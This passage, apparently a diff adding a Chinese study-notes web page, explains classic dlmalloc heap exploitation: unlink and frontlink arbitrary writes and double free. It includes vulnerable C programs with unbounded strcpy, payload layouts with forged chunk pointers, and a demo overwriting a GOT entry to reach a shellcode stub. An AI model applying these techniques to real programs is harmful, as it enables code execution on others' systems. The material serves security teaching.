+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="cp">    BK-&gt;fd = FD;    \</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="cp">}</span>
+</code></pre></div></p>
+<p><figure markdown>
+<img alt="unlink示意" src="md-img/20191021_04.png" />
+<figcaption>unlink示意</figcaption>
+</figure></p>
+</li>
+<li>
+<p>本质：任意写（欺骗unlink宏向任意位置写入4字节数据）</p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1"></a><a href="#__codelineno-8-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-8-2" name="__codelineno-8-2"></a><a href="#__codelineno-8-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-8-3" name="__codelineno-8-3"></a><a href="#__codelineno-8-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-8-4" name="__codelineno-8-4"></a><a href="#__codelineno-8-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">second</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">third</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="hll"><a href="#__codelineno-8-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="w">    </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">666</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="hll"><a href="#__codelineno-8-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">    </span><span class="n">second</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="hll"><a href="#__codelineno-8-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="n">third</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-8-8" name="__codelineno-8-8"></a><a href="#__codelineno-8-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">first</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"> </span><span class="c1">// (1)</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9"></a><a href="#__codelineno-8-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">first</span><span class="p">);</span><span class="w">            </span><span class="c1">// (2)</span>
+<a id="__codelineno-8-10" name="__codelineno-8-10"></a><a href="#__codelineno-8-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">second</span><span class="p">);</span><span class="w">           </span><span class="c1">// (3)</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11"></a><a href="#__codelineno-8-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">                            </span><span class="c1">// (4)</span>
+<a id="__codelineno-8-12" name="__codelineno-8-12"></a><a href="#__codelineno-8-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">third</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-8-13" name="__codelineno-8-13"></a><a href="#__codelineno-8-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-8-14" name="__codelineno-8-14"></a><a href="#__codelineno-8-14"><span class="linenos" data-linenos="14 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>程序接受单个字符串参数并将其复制到<code>first</code>中，无界<code>strcpy()</code>容易造成缓冲区溢出</li>
+<li>程序调用<code>free()</code>释放第一块内存，参数会覆写第二块内存中表示上一块内存大小的域、块大小值以及前向指针和后向指针，从而也就修改了<code>free()</code>操作的行为<ul>
+<li>第二块内存的大小域的值被修改为-4 ，因此，当<code>free()</code>需要确定第三块内存的位置时，也就是说，将第二块内存的起始位置加上其大小时，会导致其起始位置减4。Doug Lea的malloc此时会错误地认为下一连续内存块自第二块内存前面4字节起。</li>
+<li>这个恶意参数也会使dlmalloc所找到的<code>PREV_INUSE</code>标志位为空， 从而dlmalloc误以为第二块内存是未分配的，导致<code>free()</code>调用<code>unlink()</code>宏来合并这两块内存</li>
+</ul>
+</li>
+<li>如果第二块内存处于未分配状态（即空闲），<code>free()</code>操作将会试图将其与第一块合并</li>
+<li>为了判断第二块内存是否处于空闲状态，<code>free()</code>会检查第3块的<code>PREV_INUSE</code>标志位</li>
+</ol>
+</li>
+<li>
+<p>payload</p>
+<ul>
+<li>第一块：<code>4bytes fd + 4bytes bk + shellcode + fill = 680 bytes</code></li>
+<li>
+<p>第二块：<code>4bytes prev size(even) + 4bytes size(-4) + 4bytes fd(fp-12) + 4bytes bk(shellcode_addr) + '\0'</code></p>
+<div class="admonition note">
+<p>欺骗系统，让系统认为第二块是空闲的，触发将第二块解链的操作）</p>
+</div>
+</li>
+</ul>
+</li>
+<li>
+<p><code>free()</code>→ 调用shellcode</p>
+<ul>
+<li>难点：确定第一块内存的大小，从而精确计算出需要覆写的第二块内存的地址</li>
+<li>攻击者可以从dlmalloc中复制<code>request2size(req, nb)</code>宏的代码到其利用代码中，然后使用这个宏计算出块的大小</li>
+</ul>
+</li>
+</ul>
+<h3 id="frontlink">frontlink技术 → 入链攻击<a class="headerlink" href="#frontlink" title="Permanent link">&para;</a></h3>
+<ul>
+<li>攻击者指定一个内存块的地址而不是shellcode的地址，攻击者在这个内存块的起始4个字节中放入可执行代码</li>
+<li>frontlink代码片段
+    <div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1"></a><a href="#__codelineno-9-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bin</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-2" name="__codelineno-9-2"></a><a href="#__codelineno-9-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="n">FD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-3" name="__codelineno-9-3"></a><a href="#__codelineno-9-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">FD</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">BK</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-9-4" name="__codelineno-9-4"></a><a href="#__codelineno-9-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="w">       </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">FD</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">BK</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">S</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">chunksize</span><span class="p">(</span><span class="n">FD</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-9-5" name="__codelineno-9-5"></a><a href="#__codelineno-9-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="w">           </span><span class="n">FD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-6" name="__codelineno-9-6"></a><a href="#__codelineno-9-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">     </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-9-7" name="__codelineno-9-7"></a><a href="#__codelineno-9-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">     </span><span class="n">BK</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-8" name="__codelineno-9-8"></a><a href="#__codelineno-9-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-9-9" name="__codelineno-9-9"></a><a href="#__codelineno-9-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-10" name="__codelineno-9-10"></a><a href="#__codelineno-9-10"><span class="linenos" data-linenos="10 "></span></a><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FD</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-9-11" name="__codelineno-9-11"></a><a href="#__codelineno-9-11"><span class="linenos" data-linenos="11 "></span></a><span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">P</span><span class="w"></span>
+</code></pre></div></li>
+<li>
+<p>本质：任意写</p>
+<ul>
+<li>
+<p>向一个内存块地址起始4个字节中放入可执行代码</p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1"></a><a href="#__codelineno-10-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-10-2" name="__codelineno-10-2"></a><a href="#__codelineno-10-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-10-3" name="__codelineno-10-3"></a><a href="#__codelineno-10-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-10-4" name="__codelineno-10-4"></a><a href="#__codelineno-10-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[]){</span><span class="w"></span>
+<a id="__codelineno-10-5" name="__codelineno-10-5"></a><a href="#__codelineno-10-5"><span class="linenos" data-linenos=" 5 "></span></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="w"> </span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span><span class="w"></span>
+<a id="__codelineno-10-6" name="__codelineno-10-6"></a><a href="#__codelineno-10-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Usage: prog_name arg1 </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-7" name="__codelineno-10-7"></a><a href="#__codelineno-10-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">-1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-8" name="__codelineno-10-8"></a><a href="#__codelineno-10-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-10-9" name="__codelineno-10-9"></a><a href="#__codelineno-10-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">second</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">third</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-10-10" name="__codelineno-10-10"></a><a href="#__codelineno-10-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">fourth</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">fifth</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">sixth</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-10-11" name="__codelineno-10-11"></a><a href="#__codelineno-10-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-12" name="__codelineno-10-12"></a><a href="#__codelineno-10-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">second</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">1500</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-13" name="__codelineno-10-13"></a><a href="#__codelineno-10-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">third</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-14" name="__codelineno-10-14"></a><a href="#__codelineno-10-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">fourth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">666</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-15" name="__codelineno-10-15"></a><a href="#__codelineno-10-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">fifth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">1508</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-16" name="__codelineno-10-16"></a><a href="#__codelineno-10-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">sixth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">12</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-10-17" name="__codelineno-10-17"></a><a href="#__codelineno-10-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">first</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w"></span>
+<a id="__codelineno-10-18" name="__codelineno-10-18"></a><a href="#__codelineno-10-18"><span class="linenos" data-linenos="18 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">fifth</span><span class="p">);</span><span class="w">                    </span><span class="c1">//(1)</span>
+<a id="__codelineno-10-19" name="__codelineno-10-19"></a><a href="#__codelineno-10-19"><span class="linenos" data-linenos="19 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">fourth</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w">        </span><span class="c1">//(2)</span>
+<a id="__codelineno-10-20" name="__codelineno-10-20"></a><a href="#__codelineno-10-20"><span class="linenos" data-linenos="20 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">second</span><span class="p">);</span><span class="w">                   </span><span class="c1">//(3)</span>
+<a id="__codelineno-10-21" name="__codelineno-10-21"></a><a href="#__codelineno-10-21"><span class="linenos" data-linenos="21 "></span></a><span class="w">    </span><span class="k">return</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w">                      </span><span class="c1">//(4)</span>
+<a id="__codelineno-10-22" name="__codelineno-10-22"></a><a href="#__codelineno-10-22"><span class="linenos" data-linenos="22 "></span></a><span class="w">                                    </span><span class="c1">//(5)</span>
+<a id="__codelineno-10-23" name="__codelineno-10-23"></a><a href="#__codelineno-10-23"><span class="linenos" data-linenos="23 "></span></a><span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ol>
+<li>当<code>fifth</code>内存块被释放时，它被放入一个筐中</li>
+<li>其直接前驱内存块<code>fourth</code>被精心设计的数据所填满（<code>argv[1]</code>），因此这里就发生了溢出，并且<code>fifth</code>的前向指针指向了一个假的内存块，这个假的内存块的后向指针的位置包含有一个函数指针的地址（地址减8）。一个合适的函数指针是存储于程序<code>.dtors</code>区中的第一个析构函数的地址，攻击者可以通过检查可执行映像而获得这个地址。</li>
+<li>当<code>second</code>块被释放时，程序使<code>frontlink()</code>代码段将其插入到与<code>fifth</code>块相同的筐中。<code>second</code>比<code>fifth</code>内存块小，frontlink代码中的<code>while</code>循环执行了</li>
+<li>对<code>return(0)</code>的调用，本来应该导致程序的析构函数被调用，而现在实际调用的却是shellcode</li>
+<li><code>fifth</code>块的前向指针被存储到<code>FD</code>中，假内存块的后向指针存储到变量<code>BK</code>中，现在<code>BK</code>包含有函数指针的地址（指针值减8）函数指针被<code>second</code>块的地址所覆写</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p>payload：一段shellcode，该shellcode的最后4个字节就是跳转到shellcode其他部分的跳转指令，并且这4个字节是first块的最后4个字节</p>
+<ul>
+<li>被攻击的内存块必须是8的整数倍减去4个字节长</li>
+</ul>
+</li>
+</ul>
+<h3 id="_5">双重释放<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<ul>
+<li>攻击条件<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 被释放内存块在内存中独立存在</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> 该内存所被放入的筐必须为空</li>
+</ul>
+</li>
+<li>
+<p>bin structure</p>
+<p><figure markdown>
+<img alt="bin structure" loading="lazy" src="md-img/20191021_05.png" width="300" />
+<img alt="bin structure" loading="lazy" src="md-img/20191021_06.png" width="300" />
+<figcaption>一般筐结构</figcaption>
+</figure></p>
+<ul>
+<li>一个空的筐和一个已分配的内存块<ul>
+<li>空的筐仅仅包含头</li>
+<li>筐和内存块之间没有任何联系</li>
+</ul>
+</li>
+<li>块被释放后，它被放入筐中<ul>
+<li>在调用frontlink后，筐的前向和后向指针指向已释放的块</li>
+</ul>
+</li>
+<li>
+<p>对内存块的第二次释放毁坏了筐结构</p>
+<ul>
+<li>
+<p>利用困难：已释放的内存没有立即放入筐中，而是被缓存；双重释放块可能和其他块合并</p>
+<p><figure markdown>
+<img alt="corrupted bin" loading="lazy" src="md-img/20191021_07.png" width="300" />
+<figcaption>损坏的筐结构</figcaption>
+</figure></p>
+<div class="highlight"><span class="filename">C</span><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><a href="#__codelineno-11-1"><span class="linenos" data-linenos=" 1 "></span></a><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">GOT_LOCATION</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="mh">0x0804c98c</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-2" name="__codelineno-11-2"></a><a href="#__codelineno-11-2"><span class="linenos" data-linenos=" 2 "></span></a><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">shellcode</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a><a href="#__codelineno-11-3"><span class="linenos" data-linenos=" 3 "></span></a><span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">jump12chars_&quot;</span><span class="w">   </span><span class="cm">/* jump */</span><span class="w"></span>
+<a id="__codelineno-11-4" name="__codelineno-11-4"></a><a href="#__codelineno-11-4"><span class="linenos" data-linenos=" 4 "></span></a><span class="s">&quot;</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-5" name="__codelineno-11-5"></a><a href="#__codelineno-11-5"><span class="linenos" data-linenos=" 5 "></span></a>
+<a id="__codelineno-11-6" name="__codelineno-11-6"></a><a href="#__codelineno-11-6"><span class="linenos" data-linenos=" 6 "></span></a><span class="kt">int</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span><span class="w"></span>
+<a id="__codelineno-11-7" name="__codelineno-11-7"></a><a href="#__codelineno-11-7"><span class="linenos" data-linenos=" 7 "></span></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-8" name="__codelineno-11-8"></a><a href="#__codelineno-11-8"><span class="linenos" data-linenos=" 8 "></span></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">shellcode_location</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-9" name="__codelineno-11-9"></a><a href="#__codelineno-11-9"><span class="linenos" data-linenos=" 9 "></span></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">first</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">second</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">third</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">fourth</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-10" name="__codelineno-11-10"></a><a href="#__codelineno-11-10"><span class="linenos" data-linenos="10 "></span></a><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">fifth</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">sixth</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">seventh</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-11" name="__codelineno-11-11"></a><a href="#__codelineno-11-11"><span class="linenos" data-linenos="11 "></span></a><span class="w">    </span><span class="n">shellcode_location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-12" name="__codelineno-11-12"></a><a href="#__codelineno-11-12"><span class="linenos" data-linenos="12 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">shellcode_location</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-13" name="__codelineno-11-13"></a><span class="hll"><a href="#__codelineno-11-13"><span class="linenos" data-linenos="13 "></span></a><span class="w">    </span><span class="n">first</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w">                </span><span class="c1">//(1)</span>
+</span><a id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="hll"><a href="#__codelineno-11-14"><span class="linenos" data-linenos="14 "></span></a><span class="w">    </span><span class="n">second</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-11-15" name="__codelineno-11-15"></a><span class="hll"><a href="#__codelineno-11-15"><span class="linenos" data-linenos="15 "></span></a><span class="w">    </span><span class="n">third</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w"></span>
+</span><a id="__codelineno-11-16" name="__codelineno-11-16"></a><span class="hll"><a href="#__codelineno-11-16"><span class="linenos" data-linenos="16 "></span></a><span class="w">    </span><span class="n">fourth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w">               </span><span class="c1">//(2)</span>
+</span><a id="__codelineno-11-17" name="__codelineno-11-17"></a><a href="#__codelineno-11-17"><span class="linenos" data-linenos="17 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">first</span><span class="p">);</span><span class="w">                                </span><span class="c1">//(3)</span>
+<a id="__codelineno-11-18" name="__codelineno-11-18"></a><a href="#__codelineno-11-18"><span class="linenos" data-linenos="18 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">third</span><span class="p">);</span><span class="w">                                </span><span class="c1">//(4)</span>
+<a id="__codelineno-11-19" name="__codelineno-11-19"></a><span class="hll"><a href="#__codelineno-11-19"><span class="linenos" data-linenos="19 "></span></a><span class="w">    </span><span class="n">fifth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">128</span><span class="p">);</span><span class="w">                </span><span class="c1">//(5)</span>
+</span><a id="__codelineno-11-20" name="__codelineno-11-20"></a><a href="#__codelineno-11-20"><span class="linenos" data-linenos="20 "></span></a><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">first</span><span class="p">);</span><span class="w">                                </span><span class="c1">//(6)</span>
+<a id="__codelineno-11-21" name="__codelineno-11-21"></a><span class="hll"><a href="#__codelineno-11-21"><span class="linenos" data-linenos="21 "></span></a><span class="w">    </span><span class="n">sixth</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w">                </span><span class="c1">//(7)</span>
+</span><a id="__codelineno-11-22" name="__codelineno-11-22"></a><a href="#__codelineno-11-22"><span class="linenos" data-linenos="22 "></span></a><span class="w">    </span><span class="o">*</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">sixth</span><span class="o">+</span><span class="mi">0</span><span class="p">))</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)(</span><span class="n">GOT_LOCATION</span><span class="mi">-12</span><span class="p">);</span><span class="w">  </span><span class="c1">//(8)</span>
+<a id="__codelineno-11-23" name="__codelineno-11-23"></a><a href="#__codelineno-11-23"><span class="linenos" data-linenos="23 "></span></a><span class="w">    </span><span class="o">*</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="o">**</span><span class="p">)(</span><span class="n">sixth</span><span class="o">+</span><span class="mi">4</span><span class="p">))</span><span class="o">=</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">shellcode_location</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-24" name="__codelineno-11-24"></a><span class="hll"><a href="#__codelineno-11-24"><span class="linenos" data-linenos="24 "></span></a><span class="w">    </span><span class="n">seventh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span><span class="w">              </span><span class="c1">//(9)</span>
+</span><a id="__codelineno-11-25" name="__codelineno-11-25"></a><a href="#__codelineno-11-25"><span class="linenos" data-linenos="25 "></span></a><span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">fifth</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;something&quot;</span><span class="p">);</span><span class="w">                 </span><span class="c1">//(10)</span>
+<a id="__codelineno-11-26" name="__codelineno-11-26"></a><a href="#__codelineno-11-26"><span class="linenos" data-linenos="26 "></span></a><span class="w">                                                </span><span class="c1">//(11)</span>
